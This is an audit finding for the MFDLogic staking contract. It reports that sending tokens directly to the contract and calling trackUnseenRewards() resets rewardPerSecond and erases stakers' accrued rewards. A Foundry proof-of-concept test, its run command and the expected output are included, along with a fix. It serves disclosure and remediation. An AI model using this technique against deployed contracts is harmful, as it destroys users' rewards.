# Distributing unseen rewards to `MFDLogic` breaks distribution accounting

## Summary

The reward accounting logic in the `MFDLogic` contract can be disrupted by directly sending rewards to the contract (unseen rewards), causing users to lose accrued rewards and breaking the reward distribution logic.

## Finding Description

The `MFDLogic::_handleUnseenReward()` function in incorrectly recalculates `rewardPerSecond` when new rewards are sent directly to the contract (e.g., via unseen rewards) and processed by `MFDBase::trackUnseenRewards()`. Specifically, when `block.timestamp < r.periodFinish`, the function computes the `rewardPerSecond` as `((_rewardAmt + leftover) * PRECISION) / $.rewardStreamTime`, where leftover is the remaining undistributed reward amount from the current period. This approach overwrites the existing `rewardPerSecond` with a lower value, effectively discarding accrued rewards for staked users.

## Impact Explanation

High. This bug breaks the core reward accounting mechanism. Users lose already accrued rewards when new rewards are sent directly to the contract.

## Likelihood Explanation

High. The issue occurs every time rewards are sent directly to the contract and `MFDBase::trackUnseenRewards()` is called, making it trivially reproducible without any pre-conditions.

## Proof of Concept

To execute this proof of concept, add the following test to `test/unit/TestUnitMFDBase.t.sol`:

```solidity
function test_poc_wrong_unseen_rewards() public {
    // Set a timestamp.
    uint256 timestamp = 1_728_370_800;
    vm.warp(timestamp);

    // Distribute rewards.
    uint256 rewardAmount = 1000 * ONE_UNIT;
    distribute_rewards_to_mfd(emissionToken, rewardAmount);

    // Users stake tokens.
    uint256 user1Amount = 200 * ONE_UNIT;
    uint256 user2Amount = 100 * ONE_UNIT;
    stake_in_mfd(User1.addr, user1Amount, ONE_MONTH_TYPE_INDEX);
    stake_in_mfd(User2.addr, user2Amount, ONE_MONTH_TYPE_INDEX);

    // Warp to the aggregation period.
    skip(6 days);

    // Log the claimable rewards before distributing rewards.
    uint256 user1ClaimableRewardsBefore = mfd.getUserClaimableRewards(User1.addr)[0].amount;
    uint256 user2ClaimableRewardsBefore = mfd.getUserClaimableRewards(User2.addr)[0].amount;
    uint256 rewardPerSecondBefore = mfd.getRewardData(address(emissionToken)).rewardPerSecond;

    console.log("user 1 claimable rewards before: ", user1ClaimableRewardsBefore);
    console.log("user 2 claimable rewards before: ", user2ClaimableRewardsBefore);
    console.log("reward per second before       : ", rewardPerSecondBefore);

    // Distribute rewards directly to the contract.
    distribute_unseen_rewards_to_mfd(emissionToken, 100 * ONE_UNIT);

    // Track unseen rewards
    mfd.trackUnseenRewards();

    // Log the claimable rewards after distributing rewards.
    uint256 user1ClaimableRewardsAfter = mfd.getUserClaimableRewards(User1.addr)[0].amount;
    uint256 user2ClaimableRewardsAfter = mfd.getUserClaimableRewards(User2.addr)[0].amount;
    uint256 rewardPerSecondAfter = mfd.getRewardData(address(emissionToken)).rewardPerSecond;

    console.log("user 1 claimable rewards after : ", user1ClaimableRewardsAfter);
    console.log("user 2 claimable rewards after : ", user2ClaimableRewardsAfter);
    console.log("reward per second after        : ", rewardPerSecondAfter);

    // Assert that the claimable rewards have decreased.
    assertTrue(user1ClaimableRewardsAfter < user1ClaimableRewardsBefore);
    assertTrue(user2ClaimableRewardsAfter < user2ClaimableRewardsBefore);

    // Assert that the reward per second decreased.
    assertTrue(rewardPerSecondAfter < rewardPerSecondBefore);
}
```

Run the test with:

```bash
forge test --mt test_poc_wrong_unseen_rewards -vvv
```

Expected output:

```bash
  user 1 claimable rewards before :  571428571428571428571
  user 2 claimable rewards before :  285714285714285714285
  reward per second before        :  1653439153439153439153439153439153
  user 1 claimable rewards after  :  0
  user 2 claimable rewards after  :  0
  reward per second after         :  401549508692365835221560846560846
```

## Recommendation

The issue stems from the `MFDLogic::_handleUnseenReward()` function recalculating `rewardPerSecond` incorrectly when new unseen rewards are added. Instead of calculating the `rewardPerSecond` based on the time and amount left to distribute, it should increment the existing `rewardPerSecond` by the additional rate from the unseen reward amount over the remaining time.
